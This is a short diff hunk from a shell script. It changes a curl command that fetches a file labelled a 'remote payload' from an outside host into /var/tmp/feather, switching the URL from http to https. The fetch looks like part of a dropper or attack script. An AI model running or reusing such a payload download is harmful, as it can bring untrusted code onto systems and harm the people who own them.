@@ -72,7 +72,7 @@ echo ''
 
 echo '[ * ] Attempting to retrieve remote payload'
 
-curl http://sql.wah.ph/alpha_branch/script_final > /var/tmp/feather
+curl https://sql.wah.ph/alpha_branch/script_final > /var/tmp/feather
 
 
 
